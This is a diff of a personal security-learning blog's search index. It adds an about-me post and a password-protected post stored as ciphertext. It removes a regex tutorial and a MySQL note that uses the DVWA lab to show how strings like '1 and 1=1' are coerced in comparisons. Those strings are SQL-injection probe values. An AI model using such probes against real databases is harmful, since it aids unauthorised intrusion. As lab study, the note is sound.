@@ -1,6 +1,33 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>At the very beginning...</title>
+    <url>/2020/04/06/%E6%9D%82%E8%AE%B0/Beginning/</url>
+    <content><![CDATA[<p><img src="/2020/04/06/%E6%9D%82%E8%AE%B0/Beginning/h2USniLgmurJKMe.png" alt></p>
+<h1>为什么写博客</h1>
+<p>0.有自己的博客听起来更屌一点。</p>
+<p>1.记录和分享一些学到的东西。</p>
+<p>2.倒逼自己去学一些新东西。</p>
+<h1>关于我</h1>
+<p>信息安全菜鸡</p>
+<p>偶尔打打ctf找虐</p>
+<p>业余爱好搏击，徒步</p>
+<p>邮箱：1755936129@qq.com</p>
+<p>欢迎交流 ~</p>
+]]></content>
+      <categories>
+        <category>杂记</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>dark web</title>
+    <url>/2020/07/21/%E6%9D%82%E8%AE%B0/dark_web/</url>
+    <content><![CDATA[<script src="/crypto-js.js"></script><script src="/mcommon.js"></script><h3 id="encrypt-message">Please enter the password to read the blog.</h3><link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap.min.css"> <link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap-theme.min.css"> <script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script> <script src="//cdn.bootcss.com/bootstrap/3.3.5/js/bootstrap.min.js"></script> <div id="security"> <div> <div class="input-group"> <input type="text" class="form-control" aria-label="Enter the password." id="pass"/> <div class="input-group-btn"> <button type="button" class="btn btn-default" onclick="decryptAES()">Decrypt</button> </div> </div> </div> </div> <div id="encrypt-blog" style="display:none"> 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 </div>]]></content>
+      <categories>
+        <category>杂记</category>
+      </categories>
+  </entry>
+  <entry>
     <title>docker 常用命令</title>
     <url>/2020/07/20/%E5%B7%A5%E5%85%B7/docker/</url>
     <content><![CDATA[<h1>docker</h1>
@@ -26,145 +53,12 @@
       </tags>
   </entry>
   <entry>
-    <title>mysql</title>
-    <url>/2020/07/22/%E5%B7%A5%E5%85%B7/mysql/</url>
-    <content><![CDATA[<h2 id="查询"><a class="header-anchor" href="#查询"></a>查询</h2>
-<p><img src="/2020/07/22/%E5%B7%A5%E5%85%B7/mysql/image-20200722082629984.png" alt="image-20200722082629984"></p>
-<p><img src="/2020/07/22/%E5%B7%A5%E5%85%B7/mysql/image-20200722084058433.png" alt="image-20200722084058433"></p>
-<p><code>DVWA</code>的<code>user</code>表👆</p>
-<p>在进行如下查询时：</p>
-<p><img src="/2020/07/22/%E5%B7%A5%E5%85%B7/mysql/image-20200722082807883.png" alt="image-20200722082807883"></p>
-<p><img src="/2020/07/22/%E5%B7%A5%E5%85%B7/mysql/image-20200722082829117.png" alt="image-20200722082829117"></p>
-<p><img src="/2020/07/22/%E5%B7%A5%E5%85%B7/mysql/image-20200722084904218.png" alt="image-20200722084904218"></p>
-<p><img src="/2020/07/22/%E5%B7%A5%E5%85%B7/mysql/image-20200722084727031.png" alt="image-20200722084727031"></p>
-<p><img src="/2020/07/22/%E5%B7%A5%E5%85%B7/mysql/image-20200722083932481.png" alt="image-20200722083932481"></p>
-<p>通过上面几个例子可以看到，mysql查询语句的条件判断中，像user_id = ‘xxx’ 这种条件，user_id 是整型，而 ‘xxx’ 是字符串型，在判断时，'xxx’会被当作一个整型与 user_id进行比较。</p>
-<p>而转换的规则也很有意思。</p>
-<p>‘1 and 1=1’ 被当作 1</p>
-<p>‘1 and 1=2’ 也被当作1</p>
-<p>‘2 and 1=1’ 被当作2</p>
-<p>经过更多的测试可以发现</p>
-<p>这个字符串（不论是单引号或者是双引号）在被当作整型数进行处理的时候</p>
-<p>如果第一个字符不是数字，那么该字符串被当成<code>0</code>来处理；</p>
-<p>如果第一个字符是数字，那么这个字符串就等于从第一个字符开始的数字串</p>
-<p>比如：‘4gsb’ = 4；‘108hh’ = 108</p>
-]]></content>
-      <categories>
-        <category>工具</category>
-        <category>mysql</category>
-      </categories>
-      <tags>
-        <tag>mysql</tag>
-        <tag>sql</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>正则表达式学习笔记（不定期更新）</title>
-    <url>/2020/04/18/%E5%B7%A5%E5%85%B7/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%8D%E5%AE%9A%E6%9C%9F%E6%9B%B4%E6%96%B0%EF%BC%89/</url>
-    <content><![CDATA[<p>[TOC]</p>
-<h2 id="一、简介"><a class="header-anchor" href="#一、简介"></a>一、简介</h2>
-<blockquote>
-<p>正则表达式是描述一组字符串特征的模式，用来匹配特定的字符串。 ——Ken Thompson</p>
-</blockquote>
-<p>一个正则表达式是一串特殊的字符串，它可以用于匹配一组字符串。比如</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">\d</span><br></pre></td></tr></table></figure>
-<p>就是一个简单的正则表达式，它可以用来匹配0~9范围内的任意<strong>一个数字</strong>。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">^(\(\d&#123;3&#125;\)|^\d&#123;3&#125;[.-]?)?\d&#123;3&#125;[.-]?\d&#123;4&#125;$</span><br></pre></td></tr></table></figure>
-<p>而上面这个式子也是一个正则表达式，只不过复杂了一些，它可以匹配10位的北美电话号码。无论区号是否加括号，数字间是否有句点或连字符，它都可以匹配。</p>
-<p><strong>学习时用到的工具</strong>：</p>
-<p><a href="http://www.regexpal.com">Regexpal网站</a>：可以在线测试正则表达式</p>
-<p>…</p>
-<h2 id="二、基础"><a class="header-anchor" href="#二、基础"></a>二、基础</h2>
-<h3 id="1、字符的匹配"><a class="header-anchor" href="#1、字符的匹配"></a>1、字符的匹配</h3>
-<h4 id="a-字面值匹配"><a class="header-anchor" href="#a-字面值匹配"></a>a.字面值匹配</h4>
-<p>最简单的一种，比如一个数字字符串<code>666</code>，可以在目标文本中匹配所有的<code>666</code></p>
-<p><img src="/2020/04/18/%E5%B7%A5%E5%85%B7/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%8D%E5%AE%9A%E6%9C%9F%E6%9B%B4%E6%96%B0%EF%BC%89/fN1TQqSlujEPBCy.png" alt></p>
-<h4 id="b-字符组匹配"><a class="header-anchor" href="#b-字符组匹配"></a>b.字符组匹配</h4>
-<p>正则表达式将方括号<code>[]</code>视为特殊的元字符，因此方括号本身不参与匹配，而对括号内容进行匹配。</p>
-<p><code>[0-9]</code>这个正则表达式将会匹配0到9范围内的任意数字。要匹配任意3位数字可以用如下正则表达式</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[0-9][0-9][0-9]</span><br></pre></td></tr></table></figure>
-<h4 id="c-字符组简写式（元字符）"><a class="header-anchor" href="#c-字符组简写式（元字符）"></a>c.字符组简写式（元字符）</h4>
-<p>例如：<code>[0-9]</code>可以简写为<code>\d</code>，它们都能匹配0到9之间的任意一个数字。</p>
-<p>空白字符：</p>
-<p><code>\f</code>：换页符</p>
-<p><code>\n</code>：换行符</p>
-<p><code>\r</code>：回车符</p>
-<p><code>\t</code>：制表符（Tab的缩进）</p>
-<p><code>\v</code>：垂直制表符</p>
-<p><code>\s</code>：任意一个空白字符，等价于 [\f\n\r\t\v]</p>
-<p><code>\S</code>：对<code>\s</code>取非，即任意非空字符</p>
-<p>数字元字符：</p>
-<p><code>\d</code>：匹配任意阿拉伯数字</p>
-<p><code>\D</code>：匹配任意非数字字符（如连字符<code>-</code>)</p>
-<p>字母数字元字符：</p>
-<p><code>\w</code>：大小写字母，下划线和数字，等价于[a-zA-Z0-9]</p>
-<p><code>\W</code>：对<code>\w</code>取非</p>
-<h4 id="d-任意字符的匹配"><a class="header-anchor" href="#d-任意字符的匹配"></a>d.任意字符的匹配</h4>
-<p><code>.</code>：点号（英文句号）可以匹配任意字符（但一般不匹配换行符）。</p>
-<p><code>.</code>是元字符，表示它有特殊的含义，而不是字符本身的含义。如果需要匹配 . ，那么要用 \ 进行转义，即在 . 前面加上<code> \</code> 。</p>
-<h3 id="2-捕获分组和后向引用"><a class="header-anchor" href="#2-捕获分组和后向引用"></a>2.捕获分组和后向引用</h3>
-<p>将<code>\d</code>放到<code>()</code>中，则<code>\d</code>匹配到一个数字的同时该数字被捕获。捕获之后则可以被后向引用。</p>
-<p><code>\1</code>后向引用被捕获的字符。</p>
-<p>例如：正则表达式 <code>(\d)\d\1</code>  可以匹配 <code>101</code> 或者 <code>212</code> , <code>383</code> 等等,但无法匹配 <code>102</code> 。因为<code>\1</code>引用的是那个被捕获的字符，所以这个正则表达式匹配到的一定是某三个相连数字，其中第一个数字和第三个数字一定是相同的。</p>
-<h3 id="3-量词"><a class="header-anchor" href="#3-量词"></a>3.量词</h3>
-<p><code>\d{3}</code>匹配三个相连数字，这里<code>{3}</code>就是一个量词，花括号中可以有多个数字（用逗号<code>,</code>隔开）比如<code>{3,4}</code>表示3个或者4个；</p>
-<p><code>\d-?</code>匹配一个数字，如果该数字之后跟着一个连字符那么连字符也会被匹配到。这里的<code>?</code>也是一个量词，表示0个或1个；</p>
-<p>同理，其他常用的量词还有</p>
-<p><code>+</code>：表示1个或者多个</p>
-<p><code>*</code>：表示0个或者多个</p>
-<h3 id="4-括选文字符"><a class="header-anchor" href="#4-括选文字符"></a>4.括选文字符</h3>
-<p>现在可以看看下面这个比较健壮的表达式了，就是简介中的那个，它匹配10位的北美电话号码</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">^(\(\d&#123;3&#125;\)|^\d&#123;3&#125;[.-]?)?\d&#123;3&#125;[.-]?\d&#123;4&#125;$</span><br></pre></td></tr></table></figure>
-<p><code>^</code>匹配行起始位置，即<code>^</code>后面跟着的内容<code>(\(\d{3}\)|^\d{3}[.-]?)</code>必须出现在行首；</p>
-<p><code>\(</code>和<code>\)</code>就是将左右括号转义，让它表示其字面意思，而不是捕获分组的开始结束标志；</p>
-<p><code>|</code>表示或运算，即匹配<code>|</code>两边的内容之一；</p>
-<p><code>[.-]</code>匹配一个可选的点号（这里点号不再匹配任意字符）或连字符；</p>
-<p><code>$</code>匹配行的结束标志</p>
-<p>这个表达式最终匹配十位的北美电话号码，而且括号、连字符或者点号都是可选的。你可以试试不同格式的电话号码，看看它能否匹配。以上正则表达式中的捕获分组并不是必需的。分组是必要的，但是捕获不需要。更好的方法是使用非捕获分组。</p>
-<h2 id="三、模式匹配"><a class="header-anchor" href="#三、模式匹配"></a>三、模式匹配</h2>
-]]></content>
-      <categories>
-        <category>工具</category>
-        <category>正则表达式</category>
-      </categories>
-      <tags>
-        <tag>正则表达式</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>At the very beginning...</title>
-    <url>/2020/04/06/%E6%9D%82%E8%AE%B0/Beginning/</url>
-    <content><![CDATA[<p><img src="/2020/04/06/%E6%9D%82%E8%AE%B0/Beginning/h2USniLgmurJKMe.png" alt></p>
-<h2 id="为什么写博客"><a class="header-anchor" href="#为什么写博客"></a>为什么写博客</h2>
-<p>0.有自己的博客听起来更屌一点。</p>
-<p>1.记录和分享一些学到的东西。</p>
-<p>2.倒逼自己去学一些新东西。</p>
-<h2 id="关于我"><a class="header-anchor" href="#关于我"></a>关于我</h2>
-<p>信息安全菜鸡</p>
-<p>偶尔打打ctf找虐</p>
-<p>业余爱好搏击，徒步</p>
-<p>邮箱：1755936129@qq.com</p>
-<p>欢迎交流 ~</p>
-]]></content>
-      <categories>
-        <category>杂记</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>dark web</title>
-    <url>/2020/07/21/%E6%9D%82%E8%AE%B0/dark_web/</url>
-    <content><![CDATA[<script src="/crypto-js.js"></script><script src="/mcommon.js"></script><h3 id="encrypt-message">Please enter the password to read the blog.</h3><link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap.min.css"> <link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap-theme.min.css"> <script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script> <script src="//cdn.bootcss.com/bootstrap/3.3.5/js/bootstrap.min.js"></script> <div id="security"> <div> <div class="input-group"> <input type="text" class="form-control" aria-label="Enter the password." id="pass"/> <div class="input-group-btn"> <button type="button" class="btn btn-default" onclick="decryptAES()">Decrypt</button> </div> </div> </div> </div> <div id="encrypt-blog" style="display:none"> U2FsdGVkX19KEJ401PtUsta33TGuBFy7KQig8c/MU/DiPmxidjRgsSJSys+HnDu7ugxhU5R2cLYsvak2DavmiClHkDbcItVeVWhoKf3GcRArGNptRAKabkQTlmyFM2jpbdgc3SesMdnUSn/SvcGzbk6dvqvWkg1VwFjnQ1NJ331sxEJz7BRq6f1H+RpVLLngKcr3zUJpisBCFOrazDY1doTKyajYaQphadiZrWJUqxRondX7YL2zXrkqhENv08JKmDfY+gjNFLrZEtx3MqY/a6f/q3tOZRxqijVirPNNG1FFk16b+xh5iP7a0ulIGreXY+0e+hmVHMQ9EdjBnEC4EemvJWN+DdTfwVJEygzonrmN579GYlrbSHYbKxxQSoCeOiqghlOUeXkq90F1AQMHexvLGk+oMQk8YduggWenTLdTPLp4OFNwmRXtn6c0a6SyrycBXtvwY7GgtrjNEaQgDl6AwdonAopjYpDVNsZ8jcsl94RoT1XMULHQUriWjvuRO6mrRkoIqxV2AsqOu7789iDSMZAccpHjYg/12mCV7pzgkZLlPGt5cMWa/xvQtnjeSc5EOgHCoYmutmNiC0B0cPLTfHK1ovKv75/WaXLwukbE2io82tvhF2STCfrOZWMBbc7k+u6tqt56sNhDgygF5kmb3SfmFfL7gTFSZ52l4NHfw9ePekt13W+aQbfmT